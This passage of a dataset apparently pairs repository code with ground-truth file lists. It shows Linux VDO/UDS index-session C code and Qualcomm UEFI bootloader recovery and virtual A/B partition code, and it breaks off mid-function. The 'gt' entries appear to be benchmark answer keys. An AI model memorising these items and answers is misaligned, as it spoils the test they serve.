UDS_SUCCESS)\n\t\tvdo_log_error_strerror(result, \"Failed %s\",\n\t\t\t\t       get_open_type_string(open_type));\n\n\tfinish_loading_index_session(session, result);\n\treturn uds_status_to_errno(result);\n}\n\nstatic void wait_for_no_requests_in_progress(struct uds_index_session *index_session)\n{\n\tmutex_lock(&index_session->request_mutex);\n\twhile (index_session->request_count > 0) {\n\t\tuds_wait_cond(&index_session->request_cond,\n\t\t\t      &index_session->request_mutex);\n\t}\n\tmutex_unlock(&index_session->request_mutex);\n}\n\nstatic int __must_check save_index(struct uds_index_session *index_session)\n{\n\twait_for_no_requests_in_progress(index_session);\n\treturn uds_save_index(index_session->index);\n}\n\nstatic void suspend_rebuild(struct uds_index_session *session)\n{\n\tmutex_lock(&session->load_context.mutex);\n\tswitch (session->load_context.status) {\n\tcase INDEX_OPENING:\n\t\tsession->load_context.status = INDEX_SUSPENDING;\n\n\n\t\twhile ((session->load_context.status != INDEX_SUSPENDED) &&\n\t\t       (session->load_context.status != INDEX_READY)) {\n\t\t\tuds_wait_cond(&session->load_context.cond,\n\t\t\t\t      &session->load_context.mutex);\n\t\t}\n\n\t\tbreak;\n\n\tcase INDEX_READY:\n\n\t\tbreak;\n\n\tcase INDEX_SUSPENDED:\n\tcase INDEX_SUSPENDING:\n\tcase INDEX_FREEING:\n\tdefault:\n\n\t\tVDO_ASSERT_LOG_ONLY(false, \"Bad load context state %u\",\n\t\t\t\t    session->load_context.status);\n\t\tbreak;\n\t}\n\tmutex_unlock(&session->load_context.mutex);\n}\n\n\nint uds_suspend_index_session(struct uds_index_session *session, bool save)\n{\n\tint result = UDS_SUCCESS;\n\tbool no_work = false;\n\tbool rebuilding = false;\n\n\n\tmutex_lock(&session->request_mutex);\n\twhile (session->state & IS_FLAG_CLOSING)\n\t\tuds_wait_cond(&session->request_cond, &session->request_mutex);\n\n\tif ((session->state & IS_FLAG_WAITING) || (session->state & IS_FLAG_DESTROYING)) {\n\t\tno_work = true;\n\t\tvdo_log_info(\"Index session is already changing state\");\n\t\tresult = -EBUSY;\n\t} else if (session->state & IS_FLAG_SUSPENDED) {\n\t\tno_work = true;\n\t} else if (session->state & IS_FLAG_LOADING) {\n\t\tsession->state |= IS_FLAG_WAITING;\n\t\trebuilding = true;\n\t} else if (session->state & IS_FLAG_LOADED) {\n\t\tsession->state |= IS_FLAG_WAITING;\n\t} else {\n\t\tno_work = true;\n\t\tsession->state |= IS_FLAG_SUSPENDED;\n\t\tuds_broadcast_cond(&session->request_cond);\n\t}\n\tmutex_unlock(&session->request_mutex);\n\n\tif (no_work)\n\t\treturn uds_status_to_errno(result);\n\n\tif (rebuilding)\n\t\tsuspend_rebuild(session);\n\telse if (save)\n\t\tresult = save_index(session);\n\telse\n\t\tresult = uds_flush_index_session(session);\n\n\tmutex_lock(&session->request_mutex);\n\tsession->state &= ~IS_FLAG_WAITING;\n\tsession->state |= IS_FLAG_SUSPENDED;\n\tuds_broadcast_cond(&session->request_cond);\n\tmutex_unlock(&session->request_mutex);\n\treturn uds_status_to_errno(result);\n}\n\nstatic int replace_device(struct uds_index_session *session, struct block_device *bdev)\n{\n\tint result;\n\n\tresult = uds_replace_index_storage(session->index, bdev);\n\tif (result != UDS_SUCCESS)\n\t\treturn result;\n\n\tsession->parameters.bdev = bdev;\n\treturn UDS_SUCCESS;\n}\n\n\nint uds_resume_index_session(struct uds_index_session *session,\n\t\t\t     struct block_device *bdev)\n{\n\tint result = UDS_SUCCESS;\n\tbool no_work = false;\n\tbool resume_replay = false;\n\n\tmutex_lock(&session->request_mutex);\n\tif (session->state & IS_FLAG_WAITING) {\n\t\tvdo_log_info(\"Index session is already changing state\");\n\t\tno_work = true;\n\t\tresult = -EBUSY;\n\t} else if (!(session->state & IS_FLAG_SUSPENDED)) {\n\n\t\tno_work = true;\n\t\tresult = UDS_SUCCESS;\n\t} else {\n\t\tsession->state |= IS_FLAG_WAITING;\n\t\tif (session->state & IS_FLAG_LOADING)\n\t\t\tresume_replay = true;\n\t}\n\tmutex_unlock(&session->request_mutex);\n\n\tif (no_work)\n\t\treturn result;\n\n\tif ((session->index != NULL) && (bdev != session->parameters.bdev)) {\n\t\tresult = replace_device(session, bdev);\n\t\tif (result != UDS_SUCCESS) {\n\t\t\tmutex_lock(&session->request_mutex);\n\t\t\tsession->state &= ~IS_FLAG_WAITING;\n\t\t\tuds_broadcast_cond(&session->request_cond);\n\t\t\tmutex_unlock(&session->request_mutex);\n\t\t\treturn uds_status_to_errno(result);\n\t\t}\n\t}\n\n\tif (resume_replay) {\n\t\tmutex_lock(&session->load_context.mutex);\n\t\tswitch (session->load_context.status) {\n\t\tcase INDEX_SUSPENDED:\n\t\t\tsession->load_context.status = INDEX_OPENING;\n\n\t\t\tuds_broadcast_cond(&session->load_context.cond);\n\t\t\tbreak;\n\n\t\tcase INDEX_READY:\n\n\t\t\tbreak;\n\n\t\tcase INDEX_OPENING:\n\t\tcase INDEX_SUSPENDING:\n\t\tcase INDEX_FREEING:\n\t\tdefault:\n\n\t\t\tVDO_ASSERT_LOG_ONLY(false, \"Bad load context state %u\",\n\t\t\t\t\t    session->load_context.status);\n\t\t\tbreak;\n\t\t}\n\t\tmutex_unlock(&session->load_context.mutex);\n\t}\n\n\tmutex_lock(&session->request_mutex);\n\tsession->state &= ~IS_FLAG_WAITING;\n\tsession->state &= ~IS_FLAG_SUSPENDED;\n\tuds_broadcast_cond(&session->request_cond);\n\tmutex_unlock(&session->request_mutex);\n\treturn UDS_SUCCESS;\n}\n\nstatic int save_and_free_index(struct uds_index_session *index_session)\n{\n\tint result = UDS_SUCCESS;\n\tbool suspended;\n\tstruct uds_index *index = index_session->index;\n\n\tif (index == NULL)\n\t\treturn UDS_SUCCESS;\n\n\tmutex_lock(&index_session->request_mutex);\n\tsuspended = (index_session->state & IS_FLAG_SUSPENDED);\n\tmutex_unlock(&index_session->request_mutex);\n\n\tif (!suspended) {\n\t\tresult = uds_save_index(index);\n\t\tif (result != UDS_SUCCESS)\n\t\t\tvdo_log_warning_strerror(result,\n\t\t\t\t\t\t \"ignoring error from save_index\");\n\t}\n\tuds_free_index(index);\n\tindex_session->index = NULL;\n\n\n\tmutex_lock(&index_session->load_context.mutex);\n\tindex_session->load_context.status = INDEX_OPENING;\n\tmutex_unlock(&index_session->load_context.mutex);\n\n\tmutex_lock(&index_session->request_mutex);\n\n\tindex_session->state &= IS_FLAG_SUSPENDED;\n\tmutex_unlock(&index_session->request_mutex);\n\n\treturn result;\n}\n\n\nint uds_close_index(struct uds_index_session *index_session)\n{\n\tint result = UDS_SUCCESS;\n\n\n\tmutex_lock(&index_session->request_mutex);\n\twhile ((index_session->state & IS_FLAG_WAITING) ||\n\t       (index_session->state & IS_FLAG_CLOSING)) {\n\t\tuds_wait_cond(&index_session->request_cond,\n\t\t\t      &index_session->request_mutex);\n\t}\n\n\tif (index_session->state & IS_FLAG_SUSPENDED) {\n\t\tvdo_log_info(\"Index session is suspended\");\n\t\tresult = -EBUSY;\n\t} else if ((index_session->state & IS_FLAG_DESTROYING) ||\n\t\t   !(index_session->state & IS_FLAG_LOADED)) {\n\n\t\tresult = UDS_NO_INDEX;\n\t} else {\n\t\tindex_session->state |= IS_FLAG_CLOSING;\n\t}\n\tmutex_unlock(&index_session->request_mutex);\n\tif (result != UDS_SUCCESS)\n\t\treturn uds_status_to_errno(result);\n\n\tvdo_log_debug(\"Closing index\");\n\twait_for_no_requests_in_progress(index_session);\n\tresult = save_and_free_index(index_session);\n\tvdo_log_debug(\"Closed index\");\n\n\tmutex_lock(&index_session->request_mutex);\n\tindex_session->state &= ~IS_FLAG_CLOSING;\n\tuds_broadcast_cond(&index_session->request_cond);\n\tmutex_unlock(&index_session->request_mutex);\n\treturn uds_status_to_errno(result);\n}\n\n\nint uds_destroy_index_session(struct uds_index_session *index_session)\n{\n\tint result;\n\tbool load_pending = false;\n\n\tvdo_log_debug(\"Destroying index session\");\n\n\n\tmutex_lock(&index_session->request_mutex);\n\twhile ((index_session->state & IS_FLAG_WAITING) ||\n\t       (index_session->state & IS_FLAG_CLOSING)) {\n\t\tuds_wait_cond(&index_session->request_cond,\n\t\t\t      &index_session->request_mutex);\n\t}\n\n\tif (index_session->state & IS_FLAG_DESTROYING) {\n\t\tmutex_unlock(&index_session->request_mutex);\n\t\tvdo_log_info(\"Index session is already closing\");\n\t\treturn -EBUSY;\n\t}\n\n\tindex_session->state |= IS_FLAG_DESTROYING;\n\tload_pending = ((index_session->state & IS_FLAG_LOADING) &&\n\t\t\t(index_session->state & IS_FLAG_SUSPENDED));\n\tmutex_unlock(&index_session->request_mutex);\n\n\tif (load_pending) {\n\n\t\tmutex_lock(&index_session->load_context.mutex);\n\t\tif (index_session->load_context.status == INDEX_SUSPENDED) {\n\t\t\tindex_session->load_context.status = INDEX_FREEING;\n\t\t\tuds_broadcast_cond(&index_session->load_context.cond);\n\t\t}\n\t\tmutex_unlock(&index_session->load_context.mutex);\n\n\n\t\tmutex_lock(&index_session->request_mutex);\n\t\twhile (index_session->state & IS_FLAG_LOADING) {\n\t\t\tuds_wait_cond(&index_session->request_cond,\n\t\t\t\t      &index_session->request_mutex);\n\t\t}\n\t\tmutex_unlock(&index_session->request_mutex);\n\t}\n\n\twait_for_no_requests_in_progress(index_session);\n\tresult = save_and_free_index(index_session);\n\tuds_request_queue_finish(index_session->callback_queue);\n\tindex_session->callback_queue = NULL;\n\tuds_destroy_cond(&index_session->load_context.cond);\n\tmutex_destroy(&index_session->load_context.mutex);\n\tuds_destroy_cond(&index_session->request_cond);\n\tmutex_destroy(&index_session->request_mutex);\n\tvdo_log_debug(\"Destroyed index session\");\n\tvdo_free(index_session);\n\treturn uds_status_to_errno(result);\n}\n\n\nint uds_flush_index_session(struct uds_index_session *index_session)\n{\n\twait_for_no_requests_in_progress(index_session);\n\tuds_wait_for_idle_index(index_session->index);\n\treturn UDS_SUCCESS;\n}\n\n\nstatic void collect_stats(const struct uds_index_session *index_session,\n\t\t\t  struct uds_index_stats *stats)\n{\n\tconst struct session_stats *session_stats = &index_session->stats;\n\n\tstats->current_time = ktime_to_seconds(current_time_ns(CLOCK_REALTIME));\n\tstats->posts_found = READ_ONCE(session_stats->posts_found);\n\tstats->in_memory_posts_found = READ_ONCE(session_stats->posts_found_open_chapter);\n\tstats->dense_posts_found = READ_ONCE(session_stats->posts_found_dense);\n\tstats->sparse_posts_found = READ_ONCE(session_stats->posts_found_sparse);\n\tstats->posts_not_found = READ_ONCE(session_stats->posts_not_found);\n\tstats->updates_found = READ_ONCE(session_stats->updates_found);\n\tstats->updates_not_found = READ_ONCE(session_stats->updates_not_found);\n\tstats->deletions_found = READ_ONCE(session_stats->deletions_found);\n\tstats->deletions_not_found = READ_ONCE(session_stats->deletions_not_found);\n\tstats->queries_found = READ_ONCE(session_stats->queries_found);\n\tstats->queries_not_found = READ_ONCE(session_stats->queries_not_found);\n\tstats->requests = READ_ONCE(session_stats->requests);\n}\n\nint uds_get_index_session_stats(struct uds_index_session *index_session,\n\t\t\t\tstruct uds_index_stats *stats)\n{\n\tif (stats == NULL) {\n\t\tvdo_log_error(\"received a NULL index stats pointer\");\n\t\treturn -EINVAL;\n\t}\n\n\tcollect_stats(index_session, stats);\n\tif (index_session->index != NULL) {\n\t\tuds_get_index_stats(index_session->index, stats);\n\t} else {\n\t\tstats->entries_indexed = 0;\n\t\tstats->memory_used = 0;\n\t\tstats->collisions = 0;\n\t\tstats->entries_discarded = 0;\n\t}\n\n\treturn UDS_SUCCESS;\n}\n",
        "gt": [
            "'vdo/utils/uds/config.h'",
            "'vdo/utils/uds/index-session.h'",
            "'vdo/utils/uds/index-session.c'"
        ]
    },
    {
        "files": [
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Library/BootLinux.h'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Library/Recovery.h'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/BootLib/Recovery.c'"
        ],
        "content": "'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Library/BootLinux.h'\n:\n\n#ifndef __BOOTLINUXLIB_H__\n#define __BOOTLINUXLIB_H__\n\n#include <Uefi.h>\n\n#include <Guid/FileInfo.h>\n#include <Guid/FileSystemInfo.h>\n#include <Guid/Gpt.h>\n#include <Library/BaseLib.h>\n#include <Library/BaseMemoryLib.h>\n#include <Library/CacheMaintenanceLib.h>\n#include <Library/DebugLib.h>\n#include <Library/DevicePathLib.h>\n#include <Library/DrawUI.h>\n#include <Library/IoLib.h>\n#include <Library/MemoryAllocationLib.h>\n#include <Library/PcdLib.h>\n#include <Library/PrintLib.h>\n#include <Library/TimerLib.h>\n#include <Library/UefiBootServicesTableLib.h>\n#include <Library/UefiLib.h>\n#include <Library/UefiRuntimeServicesTableLib.h>\n#include <PiDxe.h>\n#include <Protocol/BlockIo.h>\n#include <Protocol/DevicePath.h>\n#include <Protocol/EFIVerifiedBoot.h>\n#include <Protocol/FirmwareVolume2.h>\n#include <Protocol/LoadedImage.h>\n#include <Protocol/SerialIo.h>\n#include <Protocol/SimpleFileSystem.h>\n#include <Protocol/EFISecRSA.h>\n#include <Protocol/Hash.h>\n#include <Protocol/Hash2.h>\n#include <Protocol/EFIASN1X509.h>\n\n#include \"Board.h\"\n#include \"BootImage.h\"\n#include \"Decompress.h\"\n#include \"DeviceInfo.h\"\n#include \"LinuxLoaderLib.h\"\n#include \"LocateDeviceTree.h\"\n#include \"PartitionTableUpdate.h\"\n#include \"Recovery.h\"\n#include \"ShutdownServices.h\"\n#include \"UpdateCmdLine.h\"\n#include \"UpdateDeviceTree.h\"\n#include \"VerifiedBoot.h\"\n\n#define ALIGN32_BELOW(addr) ALIGN_POINTER (addr - 32, 32)\n#define LOCAL_ROUND_TO_PAGE(x, y) (((x) + (y - 1)) & (~(y - 1)))\n#define ROUND_TO_PAGE(x, y) ((ADD_OF ((x), (y))) & (~(y)))\n#define ALIGN_PAGES(x, y) (((x) + (y - 1)) / (y))\n#define DECOMPRESS_SIZE_FACTOR 8\n#define ALIGNMENT_MASK_4KB 4096\n#define MAX_NUMBER_OF_LOADED_IMAGES 32\n\n#define PATCHED_KERNEL_HEADER_SIZE 20\n\n#define PATCHED_KERNEL_MAGIC \"UNCOMPRESSED_IMG\"\n\n\n#define DT_SIZE_2MB      (2 * 1024 * 1024)\n\n#define KERNEL_32BIT_LOAD_OFFSET 0x8000\n#define KERNEL_64BIT_LOAD_OFFSET 0x80000\n\ntypedef enum {\n  KERNEL_32BIT = 0,\n  KERNEL_64BIT\n} KernelMode;\n\ntypedef enum {\n LOAD_ADDR_NONE = 0,\n LOAD_ADDR_KERNEL,\n LOAD_ADDR_RAMDISK\n} AddrType;\n\ntypedef VOID (*LINUX_KERNEL) (UINT64 ParametersBase,\n                              UINT64 Reserved0,\n                              UINT64 Reserved1,\n                              UINT64 Reserved2);\ntypedef VOID (*LINUX_KERNEL32) (UINT32 Zero, UINT32 Arch, UINTN ParametersBase);\n\ntypedef enum {\n        IMG_BOOT = 0,\n        IMG_DTBO,\n        IMG_VBMETA,\n        IMG_RECOVERY,\n        IMG_VENDOR_BOOT,\n        IMG_MAX\n} img_type;\n\ntypedef struct {\n  CHAR8 *Name;\n  VOID *ImageBuffer;\n  UINTN ImageSize;\n} ImageData;\n\ntypedef struct BootInfo {\n  BOOLEAN MultiSlotBoot;\n  BOOLEAN BootIntoRecovery;\n  BOOLEAN BootReasonAlarm;\n  CHAR16 Pname[MAX_GPT_NAME_SIZE];\n  CHAR16 BootableSlot[MAX_GPT_NAME_SIZE];\n  ImageData Images[MAX_NUMBER_OF_LOADED_IMAGES];\n  UINTN NumLoadedImages;\n  QCOM_VERIFIEDBOOT_PROTOCOL *VbIntf;\n  boot_state_t BootState;\n  CHAR8 *VBCmdLine;\n  UINT32 VBCmdLineLen;\n  UINT32 VBCmdLineFilledLen;\n  VOID *VBData;\n  UINT32 HeaderVersion;\n} BootInfo;\n\ntypedef struct BootLinuxParamlist {\n\n  UINT64 BaseMemory;\n\n  VOID *ImageBuffer;\n  UINT64 ImageSize;\n  VOID *DtboImgBuffer;\n\n\n  VOID *VendorImageBuffer;\n  UINT64 VendorImageSize;\n\n\n  UINT64 KernelLoadAddr;\n  UINT64 KernelEndAddr;\n  UINT64 RamdiskLoadAddr;\n  UINT64 DeviceTreeLoadAddr;\n  UINT64 *HypDtboBaseAddr;\n  UINT32 NumHypDtbos;\n\n\n  UINT32 PageSize;\n  UINT32 KernelSize;\n  UINT32 SecondSize;\n  UINT32 RamdiskSize;\n  UINT32 RamdiskOffset;\n  UINT32 PatchedKernelHdrSize;\n  UINT32 DtbOffset;\n\n\n\n  UINT32 VendorRamdiskSize;\n\n\n  UINT32 KernelSizeActual;\n\n  CHAR8 *FinalCmdLine;\n  CHAR8 *CmdLine;\n  BOOLEAN BootingWith32BitKernel;\n  BOOLEAN BootingWithPatchedKernel;\n  BOOLEAN BootingWithGzipPkgKernel;\n} BootParamlist;\n\nEFI_STATUS\nBootLinux (BootInfo *Info);\nEFI_STATUS\nCheckImageHeader (VOID *ImageHdrBuffer,\n                  UINT32 ImageHdrSize,\n                  VOID *VendorImageHdrBuffer,\n                  UINT32 VendorImageHdrSize,\n                  UINT32 *ImageSizeActual,\n                  UINT32 *PageSize,\n                  BOOLEAN BootIntoRecovery);\nEFI_STATUS\nLoadImageHeader (CHAR16 *Pname, VOID **ImageHdrBuffer, UINT32 *ImageHdrSize);\nEFI_STATUS\nLoadImage (CHAR16 *Pname, VOID **ImageBuffer,\n           UINT32 ImageSizeActual, UINT32 PageSize);\n\n\nBOOLEAN TargetBuildVariantUser (VOID);\nBOOLEAN IsLEVariant (VOID);\nBOOLEAN IsBuildAsSystemRootImage (VOID);\nBOOLEAN IsBuildUseRecoveryAsBoot (VOID);\nEFI_STATUS\nGetImage (CONST BootInfo *Info,\n          VOID **ImageBuffer,\n          UINTN *ImageSize,\n          CHAR8 *ImageName);\nBOOLEAN\nLoadAndValidateDtboImg (BootInfo *Info,\n                        BootParamlist *BootParamlistPtr);\nVOID SetBootDevImage (VOID);\nVOID ResetBootDevImage (VOID);\nBOOLEAN IsBootDevImage (VOID);\nBOOLEAN IsABRetryCountDisabled (VOID);\nBOOLEAN IsDynamicPartitionSupport (VOID);\nBOOLEAN IsVirtualAbOtaSupported (VOID);\nUINT64 SetandGetLoadAddr (BootParamlist *BootParamlistPtr, AddrType Type);\nBOOLEAN IsNANDSquashFsSupport (VOID);\nBOOLEAN IsEnableDisplayMenuFlagSupported (VOID);\nBOOLEAN IsSystemdBootslotEnabled (VOID);\n#endif\n\n'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Library/Recovery.h'\n:\n\n#ifndef _BOOTLOADER_RECOVERY_H\n#define _BOOTLOADER_RECOVERY_H\n\n#include \"LinuxLoaderLib.h\"\n\n#define FFBM_MODE_BUF_SIZE 8\n\n#define RECOVERY_BOOT_RECOVERY \"boot-recovery\"\n#define RECOVERY_BOOT_FASTBOOT \"boot-fastboot\"\n\n\nstruct RecoveryMessage {\n  CHAR8 command[32];\n  CHAR8 status[32];\n  CHAR8 recovery[1024];\n};\n\n#define MISC_VIRTUAL_AB_MESSAGE_VERSION 2\n#define MISC_VIRTUAL_AB_MAGIC_HEADER 0x56740AB0\n\n\n#define MISC_VIRTUALAB_OFFSET (32 * 1024)\n\nstatic CHAR8 *VabSnapshotMergeStatus[] = {\n  \"none\",\n  \"unknown\",\n  \"snapshotted\",\n  \"merging\",\n  \"cancelled\"\n};\n\ntypedef enum UINT8 {\n  NONE_MERGE_STATUS,\n  UNKNOWN_MERGE_STATUS,\n  SNAPSHOTTED,\n  MERGING,\n  CANCELLED\n} VirtualAbMergeStatus;\n\ntypedef struct {\n  UINT8 Version;\n  UINT32 Magic;\n  UINT8 MergeStatus;\n  UINT8 SourceStatus;\n  UINT8 Reserved[57];\n} __attribute__ ((packed)) MiscVirtualABMessage;\n\nEFI_STATUS\nRecoveryInit (BOOLEAN *BootIntoRecovery);\nEFI_STATUS\nGetFfbmCommand (CHAR8 *FfbmMode, UINT32 Sz);\nEFI_STATUS\nWriteRecoveryMessage (CHAR8 *Command);\nVirtualAbMergeStatus\nGetSnapshotMergeStatus (VOID);\nEFI_STATUS\nSetSnapshotMergeStatus (VirtualAbMergeStatus MergeStatus);\nEFI_STATUS\nReadFromPartition (EFI_GUID *Ptype, VOID **Msg, UINT32 Size);\n#endif\n\n'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/BootLib/Recovery.c'\n:\n\n#include \"Recovery.h\"\n#include \"AutoGen.h\"\n#include <Library/LinuxLoaderLib.h>\n#include <Library/BootLinux.h>\n\nSTATIC MiscVirtualABMessage *VirtualAbMsg = NULL;\n\nSTATIC EFI_STATUS\nWriteVirtualABMessage (UINT8 MergeStatus)\n{\n  EFI_STATUS Status;\n  EFI_BLOCK_IO_PROTOCOL *BlkIo = NULL;\n  PartiSelectFilter HandleFilter;\n  HandleInfo HandleInfoList[1];\n  UINT32 MaxHandles;\n  UINT32 BlkIOAttrib = 0;\n  EFI_HANDLE *Handle = NULL;\n  EFI_GUID Ptype = gEfiMiscPartitionGuid;\n  MemCardType CardType = UNKNOWN;\n  UINT32 PageSize;\n  UINT32 Offset;\n\n  CardType = CheckRootDeviceType ();\n  if (CardType == NAND) {\n    return EFI_UNSUPPORTED;\n  }\n\n  GetPageSize (&PageSize);\n\n  BlkIOAttrib = BLK_IO_SEL_PARTITIONED_GPT;\n  BlkIOAttrib |= BLK_IO_SEL_MEDIA_TYPE_NON_REMOVABLE;\n  BlkIOAttrib |= BLK_IO_SEL_MATCH_PARTITION_TYPE_GUID;\n\n  HandleFilter.RootDeviceType = NULL;\n  HandleFilter.PartitionType = &Ptype;\n  HandleFilter.VolumeName = NULL;\n\n  MaxHandles = ARRAY_SIZE (HandleInfoList);\n  Status =\n      GetBlkIOHandles (BlkIOAttrib, &HandleFilter, HandleInfoList, &MaxHandles);\n\n  if (Status == EFI_SUCCESS) {\n    if (MaxHandles == 0) {\n      return EFI_NO_MEDIA;\n    }\n\n    if (MaxHandles != 1) {\n\n      DEBUG ((EFI_D_INFO, \"%s: multiple partitions found.\\r\\n\", __func__));\n      return EFI_LOAD_ERROR;\n    }\n  } else {\n    DEBUG ((EFI_D_ERROR,\n            \"%s: GetBlkIOHandles failed: %r\\n\", __func__, Status));\n    return Status;\n  }\n\n  BlkIo = HandleInfoList[0].BlkIo;\n  Handle = HandleInfoList[0].Handle;\n  Offset = MISC_VIRTUALAB_OFFSET / BlkIo->Media->BlockSize;\n  Status = WriteBlockToPartition (BlkIo, Handle,\n                                  Offset, PageSize, VirtualAbMsg);\n\n  if (Status != EFI_SUCCESS) {\n    DEBUG ((EFI_D_ERROR,\n          \"Write the VirtualAbMsg failed :%r\\n\", Status));\n  }\n\n  return Status;\n}\n\nEFI_STATUS SetSnapshotMergeStatus (VirtualAbMergeStatus MergeStatus)\n{\n  EFI_STATUS Status;\n  VirtualAbMergeStatus OldMergeStatus;\n\n  if (VirtualAbMsg == NULL) {\n    return EFI_NOT_FOUND;\n  }\n\n  OldMergeStatus = VirtualAbMsg->MergeStatus;\n  VirtualAbMsg->MergeStatus = MergeStatus;\n\n  Status = WriteVirtualABMessage (MergeStatus);\n  if (Status != EFI_SUCCESS) {\n    VirtualAbMsg->MergeStatus = OldMergeStatus;\n  }\n  return Status;\n}\n\nSTATIC EFI_STATUS\nReadFromPartitionOffset (EFI_GUID *Ptype, VOID **Msg,\n                         UINT32 Size, UINT32 Offset)\n{\n  EFI_STATUS Status;\n  EFI_BLOCK_IO_PROTOCOL *BlkIo = NULL;\n  PartiSelectFilter HandleFilter;\n  HandleInfo HandleInfoList[1];\n  UINT32 MaxHandles;\n  UINT32 BlkIOAttrib = 0;\n  UINT64 MsgSize;\n  UINT64 PartitionSize;\n\n  BlkIOAttrib = BLK_IO_SEL_PARTITIONED_GPT;\n  BlkIOAttrib |= BLK_IO_SEL_MEDIA_TYPE_NON_REMOVABLE;\n  BlkIOAttrib |= BLK_IO_SEL_MATCH_PARTITION_TYPE_GUID;\n\n  HandleFilter.RootDeviceType = NULL;\n  HandleFilter.PartitionType = Ptype;\n  HandleFilter.VolumeName = NULL;\n\n  MaxHandles = ARRAY_SIZE (HandleInfoList);\n\n  Status =\n      GetBlkIOHandles (BlkIOAttrib, &HandleFilter, HandleInfoList, &MaxHandles);\n\n  if (Status == EFI_SUCCESS) {\n    if (MaxHandles == 0)\n      return EFI_NO_MEDIA;\n\n    if (MaxHandles != 1) {\n\n      DEBUG ((EFI_D_INFO, \"%s: multiple partitions found.\\r\\n\", __func__));\n      return EFI_LOAD_ERROR;\n    }\n  } else {\n    DEBUG ((EFI_D_ERROR,\n           \"%s: GetBlkIOHandles failed: %r\\n\", __func__, Status));\n    return Status;\n  }\n\n  BlkIo = HandleInfoList[0].BlkIo;\n  MsgSize = ROUND_TO_PAGE (Size, BlkIo->Media->BlockSize - 1);\n  PartitionSize = GetPartitionSize (BlkIo);\n  if (MsgSize > PartitionSize ||\n    !PartitionSize) {\n    return EFI_OUT_OF_RESOURCES;\n  }\n\n  *Msg = AllocateZeroPool (MsgSize);\n  if (!(*Msg)) {\n    DEBUG (\n        (EFI_D_ERROR, \"Error allocating memory for reading from Partition\\n\"));\n    return EFI_OUT_OF_RESOURCES;\n  }\n\n  if (Offset % BlkIo->Media->BlockSize) {\n    DEBUG (\n        (EFI_D_ERROR, \"Error offset:%u passed is not multiple of blocksz:%u\\n\",\n        Offset, BlkIo->Media->BlockSize));\n    return EFI_INVALID_PARAMETER;\n  }\n  Status = BlkIo->ReadBlocks (BlkIo, BlkIo->Media->MediaId,\n                               (Offset / BlkIo->Media->BlockSize),\n                               MsgSize, *Msg);\n  if (Status != EFI_SUCCESS) {\n    FreePool (*Msg);\n    *Msg = NULL;\n    return Status;\n  }\n\n  return Status;\n}\n\nVirtualAbMergeStatus\nGetSnapshotMergeStatus (VOID)\n{\n  VirtualAbMergeStatus MergeStatus = NONE_MERGE_STATUS;\n  EFI_STATUS Status;\n  EFI_GUID Ptype = gEfiMiscPartitionGuid;\n  MemCardType CardType = UNKNOWN;\n  UINT32 PageSize;\n\n  if (VirtualAbMsg == NULL) {\n\n    CardType = CheckRootDeviceType ();\n    if (CardType == NAND) {\n      return MergeStatus;\n    }\n\n    GetPageSize (&PageSize);\n\n    Status = ReadFromPartitionOffset (&Ptype, (VOID **)&VirtualAbMsg, PageSize,\n                                         MISC_VIRTUALAB_OFFSET);\n    if (Status != EFI_SUCCESS) {\n      DEBUG ((EFI_D_ERROR,\n              \"Error reading virtualab msg from misc partition: %r\\n\", Status));\n      return MergeStatus;\n    }\n\n    if (VirtualAbMsg->Magic != MISC_VIRTUAL_AB_MAGIC_HEADER ||\n        VirtualAbMsg->Version != MISC_VIRTUAL_AB_MESSAGE_VERSION) {\n      DEBUG ((EFI_D_ERROR,\n                 \"Error read virtualab msg version:%u magic:%u not valid\\n\",\n                  VirtualAbMsg->Version, VirtualAbMsg->Magic));\n      FreePool (VirtualAbMsg);\n      VirtualAbMsg = NULL;\n    } else {\n      DEBUG ((EFI_D_VERBOSE, \"read virtualab MergeStatus:%x\\n\",\n                              VirtualAbMsg->MergeStatus));\n    }\n  }\n\n  if (VirtualAbMsg) {\n    MergeStatus = VirtualAbMsg->MergeStatus;\n  }\n\n  return MergeStatus;\n}\n\nEFI_STATUS\nReadFromPartition (EFI_GUID *Ptype, VOID **Msg, UINT32 Size)\n{\n  return (ReadFromPartitionOffset (Ptype, Msg, Size, 0));\n}\n\nEFI_STATUS\nWriteRecoveryMessage (CHAR8 *Command)\n{\n  EFI_STATUS Status = EFI_SUCCESS;\n  struct RecoveryMessage * Msg = NULL;\n  EFI_GUID Ptype = gEfiMiscPartitionGuid;\n  MemCardType CardType = UNKNOWN;\n  VOID *PartitionData = NULL;\n  UINT32 PageSize;\n\n  CardType = CheckRootDeviceType ();\n  if (CardType == NAND) {\n    Status = GetNandMiscPartiGuid (&Ptype);\n    if (Status != EFI_SUCCESS) {\n      return Status;\n    }\n  }\n\n  GetPageSize (&PageSize);\n\n\n  Status = ReadFromPartition (&Ptype, (VOID **)&PartitionData, (PageSize * 2));\n\n  if (Status != EFI_SUCCESS) {\n    DEBUG ((EFI_D_ERROR, \"Error Reading from misc partition: %r\\n\", Status));\n    return Status;\n  }\n\n  if (!PartitionData) {\n    DEBUG ((EFI_D_ERROR, \"Error in loading Data from misc partition\\n\"));\n    return EFI_INVALID_PARAMETER;\n  }\n\n\n\n  Msg = (CardType == NAND) ?\n           (struct RecoveryMessage *) ((CHAR8 *) PartitionData + PageSize) :\n           (struct RecoveryMessage *) PartitionData;\n\n  Status = AsciiStrnCpyS (Msg->command, sizeof (Msg->command),\n                                  Command, AsciiStrLen (Command));\n  if (Status == EFI_SUCCESS) {\n    Status =\n       WriteToPartition (&Ptype, Msg, sizeof (struct RecoveryMessage));\n   }\n\n  FreePool (PartitionData);\n  PartitionData = NULL;\n  return Status;\n}\n\nEFI_STATUS\nRecoveryInit (BOOLEAN *BootIntoRecovery)\n{\n  EFI_STATUS Status;\n  struct RecoveryMessage *Msg = NULL;\n  EFI_GUID Ptype = gEfiMiscPartitionGuid;\n  MemCardType CardType = UNKNOWN;\n  VOID *PartitionData = NULL;\n  UINT32 PageSize;\n\n  CardType = CheckRootDeviceType ();\n  if (CardType == NAND) {\n    Status = GetNandMiscPartiGuid (&Ptype);\n    if (Status != EFI_SUCCESS) {\n      return Status;\n    }\n  }\n\n  GetPageSize (&PageSize);\n\n\n  Status = ReadFromPartition (&Ptype, (VOID **)&PartitionData, (PageSize * 2));\n  if (Status != EFI_SUCCESS) {\n  